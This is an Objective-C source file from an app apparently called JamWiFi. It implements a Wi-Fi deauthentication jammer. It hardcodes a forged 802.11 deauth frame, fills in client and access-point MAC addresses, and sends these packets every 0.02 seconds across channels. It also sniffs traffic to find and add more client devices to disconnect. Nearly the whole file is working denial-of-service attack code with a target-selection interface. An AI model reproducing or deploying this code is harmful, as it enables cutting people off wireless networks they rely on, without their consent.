//
//  ANClientKiller.m
//  JamWiFi
//
//  Created by Alex Nichol on 7/25/12.
//  Copyright (c) 2012 __MyCompanyName__. All rights reserved.
//

#import "ANClientKiller.h"
#import "ANAppDelegate.h"
#import "ANTrafficGatherer.h"

#define DEAUTH_REQ \
"\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

@implementation ANClientKiller

- (id)initWithFrame:(NSRect)frame sniffer:(ANWiFiSniffer *)theSniffer networks:(NSArray *)networks clients:(NSArray *)theClients {
    if ((self = [super initWithFrame:frame])) {
        clients = [theClients mutableCopy];
        sniffer = theSniffer;
        [sniffer setDelegate:self];
        [sniffer start];
        
        NSMutableArray * mChannels = [[NSMutableArray alloc] init];
        for (CWNetwork * net in networks) {
            if (![mChannels containsObject:net.wlanChannel]) {
                [mChannels addObject:net.wlanChannel];
            }
        }
        channels = [mChannels copy];
        channelIndex = -1;
        
        NSMutableDictionary * mNetworksPerChannel = [[NSMutableDictionary alloc] init];
        for (CWChannel * channel in channels) {
            NSMutableArray * mNetworks = [[NSMutableArray alloc] init];
            for (CWNetwork * network in networks) {
                if ([[network wlanChannel] isEqualToChannel:channel]) {
                    [mNetworks addObject:network];
                }
            }
            [mNetworksPerChannel setObject:[mNetworks copy] forKey:channel];
        }
        networksForChannel = [mNetworksPerChannel copy];
        
        jamTimer = [NSTimer scheduledTimerWithTimeInterval:0.02 target:self selector:@selector(performNextRound) userInfo:nil repeats:YES];
        [self performNextRound];
        
        [self configureUI];
    }
    return self;
}

- (void)configureUI {
    NSRect frame = self.bounds;
    infoScrollView = [[NSScrollView alloc] initWithFrame:NSMakeRect(10, 52, frame.size.width - 20, frame.size.height - 62)];
    infoTable = [[NSTableView alloc] initWithFrame:[[infoScrollView contentView] bounds]];
    doneButton = [[NSButton alloc] initWithFrame:NSMakeRect(frame.size.width - 110, 10, 100, 24)];
    backButton = [[NSButton alloc] initWithFrame:NSMakeRect(frame.size.width - 210, 10, 100, 24)];
    newClientsCheck = [[NSButton alloc] initWithFrame:NSMakeRect(10, 10, 200, 24)];
    
    [newClientsCheck setButtonType:NSSwitchButton];
    [newClientsCheck setBezelStyle:NSRoundedBezelStyle];
    [newClientsCheck setTitle:@"Actively scan for clients"];
    [newClientsCheck setState:1];
    
    [backButton setBezelStyle:NSRoundedBezelStyle];
    [backButton setTitle:@"Back"];
    [backButton setFont:[NSFont systemFontOfSize:13]];
    [backButton setTarget:self];
    [backButton setAction:@selector(backButton:)];
    
    [doneButton setBezelStyle:NSRoundedBezelStyle];
    [doneButton setTitle:@"Done"];
    [doneButton setFont:[NSFont systemFontOfSize:13]];
    [doneButton setTarget:self];
    [doneButton setAction:@selector(doneButton:)];
    
    NSTableColumn * enabledColumn = [[NSTableColumn alloc] initWithIdentifier:@"enabled"];
    [[enabledColumn headerCell] setStringValue:@"Jam"];
    [enabledColumn setWidth:30];
    [enabledColumn setEditable:YES];
    [infoTable addTableColumn:enabledColumn];
    
    NSTableColumn * stationColumn = [[NSTableColumn alloc] initWithIdentifier:@"station"];
    [[stationColumn headerCell] setStringValue:@"Station"];
    [stationColumn setWidth:120];
    [stationColumn setEditable:NO];
    [infoTable addTableColumn:stationColumn];
    
    NSTableColumn * deauthsColumn = [[NSTableColumn alloc] initWithIdentifier:@"count"];
    [[deauthsColumn headerCell] setStringValue:@"Deauths"];
    [deauthsColumn setWidth:120];
    [deauthsColumn setEditable:NO];
    [infoTable addTableColumn:deauthsColumn];
    
    [infoScrollView setDocumentView:infoTable];
    [infoScrollView setBorderType:NSBezelBorder];
    [infoScrollView setHasVerticalScroller:YES];
    [infoScrollView setHasHorizontalScroller:YES];
    [infoScrollView setAutohidesScrollers:NO];
    
    [infoTable setDataSource:self];
    [infoTable setDelegate:self];
    [infoTable setAllowsMultipleSelection:YES];
    
    [self addSubview:infoScrollView];
    [self addSubview:backButton];
    [self addSubview:doneButton];
    [self addSubview:newClientsCheck];
    
    [self setAutoresizesSubviews:YES];
    [self setAutoresizingMask:(NSViewWidthSizable | NSViewHeightSizable)];
    [infoScrollView setAutoresizingMask:(NSViewWidthSizable | NSViewHeightSizable)];
    [doneButton setAutoresizingMask:(NSViewMinXMargin)];
    [backButton setAutoresizingMask:(NSViewMinXMargin)];
}

#pragma mark - Events -

- (void)backButton:(id)sender {
    [jamTimer invalidate];
    jamTimer = nil;
    [sniffer setDelegate:nil];
    NSMutableArray * networks = [NSMutableArray array];
    for (id key in networksForChannel) {
        [networks addObjectsFromArray:[networksForChannel objectForKey:key]];
    }
    ANTrafficGatherer * gatherer = [[ANTrafficGatherer alloc] initWithFrame:self.bounds sniffer:sniffer networks:networks];
    [(ANAppDelegate *)[NSApp delegate] pushView:gatherer direction:ANViewSlideDirectionBackward];
}

- (void)doneButton:(id)sender {
    [jamTimer invalidate];
    jamTimer = nil;
    [sniffer stop];
    [sniffer setDelegate:nil];
    sniffer = nil;
    [(ANAppDelegate *)[NSApp delegate] showNetworkList];
}

#pragma mark - Table View -

- (NSInteger)numberOfRowsInTableView:(NSTableView *)tableView {
    return [clients count];
}

- (id)tableView:(NSTableView *)tableView objectValueForTableColumn:(NSTableColumn *)tableColumn row:(NSInteger)row {
    ANClient * client = [clients objectAtIndex:row];
    if ([[tableColumn identifier] isEqualToString:@"station"]) {
        return MACToString(client.macAddress);
    } else if ([[tableColumn identifier] isEqualToString:@"count"]) {
        return [NSNumber numberWithInt:client.deauthsSent];
    } else if ([[tableColumn identifier] isEqualToString:@"enabled"]) {
        return [NSNumber numberWithBool:client.enabled];
    }
    return nil;
}

- (NSCell *)tableView:(NSTableView *)tableView dataCellForTableColumn:(NSTableColumn *)tableColumn row:(NSInteger)row {
    if ([[tableColumn identifier] isEqualToString:@"enabled"]) {
        NSButtonCell * cell = [[NSButtonCell alloc] init];
        [cell setButtonType:NSSwitchButton];
        [cell setTitle:@""];
        return cell;
    }
    return nil;
}

- (void)tableView:(NSTableView *)tableView setObjectValue:(id)object forTableColumn:(NSTableColumn *)tableColumn row:(NSInteger)row {
    ANClient * client = [clients objectAtIndex:row];
    if ([[tableColumn identifier] isEqualToString:@"enabled"]) {
        [client setEnabled:[object boolValue]];
    }
}

#pragma mark - Deauthing -

- (void)performNextRound {
    channelIndex += 1;
    if (channelIndex >= [channels count]) {
        channelIndex = 0;
    }
    CWChannel * channel = [channels objectAtIndex:channelIndex];
    [sniffer setChannel:channel];
    // deauth all clients on all networks on this channel
    NSArray * networks = [networksForChannel objectForKey:channel];
    for (ANClient * client in clients) {
        if (![client enabled]) continue;
        for (CWNetwork * network in networks) {
            unsigned char bssid[6];
            copyMAC([network.bssid UTF8String], bssid);
            AN80211Packet * packet = [self deauthPacketForBSSID:bssid client:client.macAddress];
            [sniffer writePacket:packet];
            client.deauthsSent += 1;
        }
    }
    [infoTable reloadData];
}

- (AN80211Packet *)deauthPacketForBSSID:(const unsigned char *)bssid client:(const unsigned char *)client {
    char deauth[26];
    memcpy(&deauth[0], DEAUTH_REQ, 26);
    memcpy(&deauth[4], client, 6);
    memcpy(&deauth[10], bssid, 6);
    memcpy(&deauth[16], bssid, 6);
    AN80211Packet * packet = [[AN80211Packet alloc] initWithData:[NSData dataWithBytes:deauth length:26]];
    return packet;
}

- (BOOL)includesBSSID:(const unsigned char *)bssid {
    for (id key in networksForChannel) {
        for (CWNetwork * network in [networksForChannel objectForKey:key]) {
            if ([MACToString(bssid) isEqualToString:network.bssid]) {
                return YES;
            }
        }
    }
    return NO;
}

#pragma mark - WiFi Sniffer -

- (void)wifiSniffer:(ANWiFiSniffer *)sniffer gotPacket:(AN80211Packet *)packet {
    if (![newClientsCheck state]) return;
    BOOL hasClient = NO;
    unsigned char client[6];
    unsigned char bssid[6];
    if ([packet dataFCS] != [packet calculateFCS]) return;
    if (packet.macHeader->frame_control.from_ds == 0 && packet.macHeader->frame_control.to_ds == 1) {
        memcpy(bssid, packet.macHeader->mac1, 6);
        if (![self includesBSSID:bssid]) return;
        memcpy(client, packet.macHeader->mac2, 6);
        hasClient = YES;
    } else if (packet.macHeader->frame_control.from_ds == 0 && packet.macHeader->frame_control.to_ds == 0) {
        memcpy(bssid, packet.macHeader->mac3, 6);
        if (![self includesBSSID:bssid]) return;
        if (memcmp(packet.macHeader->mac2, packet.macHeader->mac3, 6) != 0) {
            memcpy(client, packet.macHeader->mac2, 6);
            hasClient = YES;
        }
    } else if (packet.macHeader->frame_control.from_ds == 1 && packet.macHeader->frame_control.to_ds == 0) {
        memcpy(bssid, packet.macHeader->mac2, 6);
        if (![self includesBSSID:bssid]) return;
        memcpy(client, packet.macHeader->mac1, 6);
        hasClient = YES;
    }
    if (client[0] == 0x33 && client[1] == 0x33) hasClient = NO;
    if (client[0] == 0x01 && client[1] == 0x00) hasClient = NO;
    if (client[0] == 0xFF && client[1] == 0xFF) hasClient = NO;
    if (client[0] == 0x03 && client[5] == 0x01) hasClient = NO;
    if (hasClient) {
        ANClient * clientObj = [[ANClient alloc] initWithMac:client bssid:bssid];
        BOOL containsClient = NO;
        for (ANClient * aClient in clients) {
            if (memcmp(aClient.macAddress, clientObj.macAddress, 6) == 0) {
                containsClient = YES;
                break;
            }
        }
        if (!containsClient) {
            [clients addObject:clientObj];
            [infoTable reloadData];
        }
    }
}

- (void)wifiSniffer:(ANWiFiSniffer *)sniffer failedWithError:(NSError *)error {
    NSLog(@"Got error: %@", error);
}

- (void)wifiSnifferFailedToOpenInterface:(ANWiFiSniffer *)sniffer {
    NSLog(@"Couldn't open interface");
}

@end
